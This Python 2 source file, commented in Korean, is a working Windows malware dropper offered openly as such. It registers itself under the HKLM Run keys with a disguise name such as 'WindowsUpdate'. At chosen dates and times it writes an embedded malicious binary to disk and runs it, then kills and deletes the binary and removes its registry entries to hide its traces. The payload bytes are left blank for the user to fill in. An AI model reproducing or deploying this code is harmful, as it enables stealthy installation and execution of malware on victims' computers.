#-*- coding: utf-8 -*-
import time, os, subprocess, threading, ctypes
from _winreg import *

ProgBinary="" # 악성프로그램 바이너리  ex) \x12\x34\x56
ProgDirectory="" # 악성프로그램 경로  ex) C:\\Windows\\SysWOW64\\
ProgName="" # 악성프로그램명  ex) TimeBoom.exe
RegName="" # 시작 레지스트리에 등록할 이름  ex) WindowsUpdate
CurProg="" # 현재 프로그램(악성프로그램을 실행할)명(경로 포함)  ex) C:\\Windows\\SysWOW64\\Dropper.exe
DateList=[] # 악성프로그램이 실행될 날짜(복수 선택 가능)  ex) ["2017.12.10", "2018.3.1"]
TimeList=[] # 악성프로그램이 실행될 시간(복수 선택 가능)  ex) ["4:4:4", "23:59:59"]
WaitTime=10 # 악성프로그램이 실행될 시간만큼 대기하는 시간(초)  ex) 300
			
def main():
    varSubKey1="SOFTWARE\WoW6432Node\Microsoft\Windows\CurrentVersion\Run"  # 서브 레지스트리 목록 지정(64비트 시작 레지스트리)
    varSubKey2="SOFTWARE\Microsoft\Windows\CurrentVersion\Run" # 32비트 시작 레지스트리
    varReg1=ConnectRegistry(None, HKEY_LOCAL_MACHINE) # 루트 레지스트리 핸들 객체 얻음
    varReg2=ConnectRegistry(None, HKEY_LOCAL_MACHINE)
    varKey1=OpenKey(varReg1, varSubKey1) # 레지스트리 핸들 객체 얻음
    varKey2=OpenKey(varReg2, varSubKey2)
    confirm=1 # 레지스트리 중복 확인 변수 초기값 설정 
    for i in range(30):
        try:
            name1, variable1, data1 = EnumValue(varKey1, i) # 레지스트리에 등록된 이름, 데이터형, 데이터 조회
            name2, variable2, data2 = EnumValue(varKey2, i)
            if(((RegName == name1) and (CurProg == variable1)) or ((RegName == name2) and (CurProg == variable2))): # 중복 등록을 막기 위한 루틴
                confirm=0 # 중복 확인 변수 값 재설정
                break
        except Exception, e:
            pass
    CloseKey(varKey1) # 레지스트리 핸들 닫음 
    CloseKey(varKey2)
    CloseKey(varReg1) # 레지스트리 닫음 
    CloseKey(varReg2)
    if(confirm==1): # 등록이 안 돼 있을 경우
        varReg1=ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        varReg2=ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        varKey1=OpenKey(varReg1, varSubKey1)
        varKey2=OpenKey(varReg2, varSubKey2)
        SetValueEx(varKey1, RegName, 0, REG_SZ, CurProg) # 현재 프로그램 등록
        SetValueEx(varKey2, RegName, 0, REG_SZ, CurProg)
        CloseKey(varKey1)
        CloseKey(varKey2)
        CloseKey(varReg1)
        CloseKey(varReg2)
        
    while(1):
        now=time.localtime() # 현재 시간 얻음 
        year=now.tm_year
        month=now.tm_mon
        day=now.tm_mday
        hour=now.tm_hour
        minute=now.tm_min
        second=now.tm_sec
        curDate=str(year)+"."+str(month)+"."+str(day) # 현재 날짜 . 포맷 맞춰서 세팅
        curTime=str(hour)+":"+str(minute)+":"+str(second) # 현재 시간 : 포맷 맞춰서 세팅
        for tDate in DateList:
            for tTime in TimeList:
                if(tDate == curDate): # 현재 날짜와 세팅 날짜가 같을 경우
                    if(tTime == curTime): # 현재 시간과 세팅 시간이 같을 경우 
                        fp=open(ProgDirectory+ProgName, "wb") # 악성프로그램 생성(바이너리 쓰기모드)
                        fp.write(ProgBinary) # 생성한 악성프로그램에 악성바이너리 쓰기
                        fp.close() 
                        ctypes.windll.shell32.ShellExecuteA(0, 'open', ProgDirectory+ProgName, None, None, 1) # 악성프로그램 실행
                        time.sleep(WaitTime) # 세팅한 시간만큼 악성프로그램이 실행되도록 대기
                        os.system("taskkill.exe /f /im "+ProgName) # 악성프로그램 강제 종료
                        os.system("del /q "+ProgDirectory+ProgName) # 악성프로그램 삭제
                        varReg1=ConnectRegistry(None, HKEY_LOCAL_MACHINE)
                        varReg2=ConnectRegistry(None, HKEY_LOCAL_MACHINE)
                        varKey1=OpenKey(varReg1, varSubKey1)
                        varKey2=OpenKey(varReg2, varSubKey2)
                        DeleteValue(varKey1, RegName) # 등록한 시작 레지스트리 삭제
                        DeleteValue(varKey2, RegName)
                        CloseKey(varKey1)
                        CloseKey(varKey2)
                        CloseKey(varReg1)
                        CloseKey(varReg2)
                        exit(0)

if __name__=="__main__":
    main()
